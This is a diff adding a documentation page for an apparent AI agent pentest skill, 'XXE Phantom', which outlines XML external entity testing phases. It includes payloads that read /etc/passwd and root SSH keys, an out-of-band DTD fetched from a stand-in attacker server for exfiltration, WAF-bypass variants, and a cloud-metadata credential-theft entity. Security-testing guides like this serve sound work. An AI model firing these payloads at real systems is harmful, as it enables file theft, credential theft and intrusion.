@@ -1,0 +1,162 @@
+---
+title: XXE Phantom
+description: Complete XXE (XML External Entity) detection and exploitation methodology — classic file read, blind OOB exfiltration, XInclude, SVG/DOCX/SAML vectors, WAF bypass, SSRF chaining, and report structure.
+---
+
+<Info>
+  **Category:** Pentest & security testing
+</Info>
+
+**Installation**
+
+```bash
+auditguard-skills add xxe-phantom
+```
+
+---
+
+## Summary
+
+Detect and exploit XML External Entity injection across all attack surfaces — from classic file read to blind OOB exfiltration and multi-step escalation chains.
+
+- Phase 1 finds the attack surface: explicit XML endpoints, hidden XML via Content-Type switching on JSON APIs, file upload vectors (SVG, DOCX, XLSX, ODT, XSL), SAML/SSO flows, SOAP, WebDAV, RSS feeds
+- Phase 2 covers classic XXE with visible output: file read, SSRF, port scanning, multi-file read, and error-based file read
+- Phase 3 covers blind XXE: OOB via DNS confirmation, OOB file exfiltration via external DTD, FTP exfiltration (bypasses HTTP-only egress), multi-line file read via PHP wrapper, and error-based blind XXE
+- Phase 4 targets file upload vectors: SVG injection, DOCX/XLSX/PPTX modification, ODT/ODS, XSL/XSLT injection
+- Phase 5 covers XInclude (works without DOCTYPE control) and Phase 6 covers SAML XXE
+- Phase 8 provides WAF bypass techniques: UTF-16 encoding, chunked transfer encoding, alternate DOCTYPE syntax, CDATA wrappers, and nested parameter entities
+- Phase 9 documents escalation chains: XXE → SSRF → cloud metadata, XXE → SSH key read, XXE → Gopher → Redis RCE
+
+---
+
+## SKILL.md
+
+### XXE Phantom — XML External Entity Injection
+
+#### When to Use This Skill
+
+Use this skill when the user:
+
+- Asks to test for XXE, XML injection, or external entity injection
+- Sees a request with `Content-Type: application/xml`, `text/xml`, or `application/soap+xml`
+- Identifies an endpoint that accepts XML in the body
+- Uploads SVG, DOCX, XLSX, ODT, PDF, or any XML-based file format
+- Sees a SAML assertion, SOAP request, RSS feed, or WebDAV request
+- Wants to read local files, probe internal services, or escalate XXE to SSRF or RCE
+
+#### What Does It Check?
+
+**In scope:**
+- Classic XXE: `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
+- SSRF via XXE: `<!ENTITY xxe SYSTEM "http://169.254.169.254/...">`
+- Blind XXE: OOB DNS/HTTP callback via external DTD
+- XInclude: `<xi:include parse="text" href="file:///etc/passwd"/>` (no DOCTYPE required)
+- File upload XXE: SVG, DOCX, XLSX, ODT, XSL/XSLT
+- SAML XXE: DOCTYPE injection into base64-decoded SAMLResponse
+- Protocol handlers: `file://`, `http://`, `ftp://`, `php://filter`, `gopher://`, `netdoc://`, `expect://`
+- WAF bypass: encoding, chunked transfer, DOCTYPE syntax variants, CDATA wrappers
+- Escalation: XXE → cloud metadata, XXE → SSH keys, XXE → Redis RCE via Gopher
+
+**Out of scope:**
+- Standard JSON API endpoints that don't accept XML — use Content-Type switching to check first
+
+#### How It Works
+
+**Phase 1: Find the Attack Surface**
+
+Check for explicit XML Content-Types, then try switching JSON APIs to XML. Test file upload features with SVG (direct XML) and DOCX/XLSX (ZIP-compressed XML). Intercept SAML flows and decode the base64 assertion.
+
+**Phase 2: Classic XXE**
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root><data>&xxe;</data></root>
+```
+
+**Phase 3: Blind XXE**
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY % remote SYSTEM "http://YOUR-SERVER/evil.dtd">
+  %remote;
+]>
+<root/>
+```
+
+Host `evil.dtd` with entity definitions that exfiltrate file contents via HTTP callbacks.
+
+**Phase 4: File Upload XXE**
+
+Inject into SVG directly; inject into DOCX/XLSX by unzipping, editing `word/document.xml` or `xl/workbook.xml`, and repacking.
+
+**Phase 5: XInclude**
+
+```xml
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/passwd"/>
+</foo>
+```
+
+Use when DOCTYPE is blocked but XML element content is user-controlled.
+
+**Phase 8: WAF Bypass**
+
+```xml
+<!-- UTF-16 encoding -->
+<?xml version="1.0" encoding="UTF-16"?>
+
+<!-- Alternate DOCTYPE syntax (comments, no spaces) -->
+<!DOCTYPE root [<!--comment--><!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+```
+
+**Phase 9: Escalation Chains**
+
+```xml
+<!-- AWS IMDSv1 credential theft -->
+<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+
+<!-- SSH private key read → server compromise -->
+<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">
+```
+
+#### Output
+
+| Severity | Condition |
+|---|---|
+| Critical | RCE via `expect://`, SSRF to cloud metadata with credential theft, SSH key read |
+| High | Local file read (passwd, source code, .env), SSRF to internal services |
+| Medium | SSRF to non-sensitive internal URLs, blind XXE confirmed but limited impact |
+| Low | XXE confirmed but no external HTTP/file access allowed |
+
+#### Known Limitations
+
+- Parser must evaluate external entities — hardened parsers (DTD processing disabled) are not vulnerable
+- Entity syntax appearing literally in the response (`&xxe;`) means reflection exists but entity expansion is disabled
+- PHP `expect://` RCE is rare — requires the expect extension to be loaded
+- GCP metadata requires `Metadata-Flavor: Google` header — may not work via XXE if parser doesn't forward custom headers
+
+---
+
+## Related skills
+
+<CardGroup cols={3}>
+  <Card title="ssrf-hunter" href="/skills/ssrf-hunter">
+    Complete SSRF detection and exploitation methodology — cloud metadata, internal network, and protocol handler abuse
+
+    
+  </Card>
+  <Card title="ssti-hunter" href="/skills/ssti-hunter">
+    Complete SSTI detection and exploitation methodology across all major template engines
+
+    
+  </Card>
+  <Card title="nuclei-template-writer" href="/skills/nuclei-template-writer">
+    Convert a vulnerability into a ready-to-run Nuclei YAML template for large-scale detection
+
+    
+  </Card>
+</CardGroup>
